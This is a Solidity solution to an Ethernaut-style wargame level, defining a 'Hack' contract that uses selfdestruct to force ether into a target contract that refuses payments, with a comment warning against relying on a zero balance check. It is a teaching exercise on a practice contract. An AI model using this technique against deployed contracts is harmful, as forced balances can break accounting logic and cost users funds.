// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// the goal of this level is to allow it take money no matter what.
// contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

 */
// }

// solution
// to do this, We shall forcefull send it funds. create a contract. then!
// self distruct and use this address and the receipt of the funds

contract Hack {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}

// do do use address(this).balance == 0 for address logic
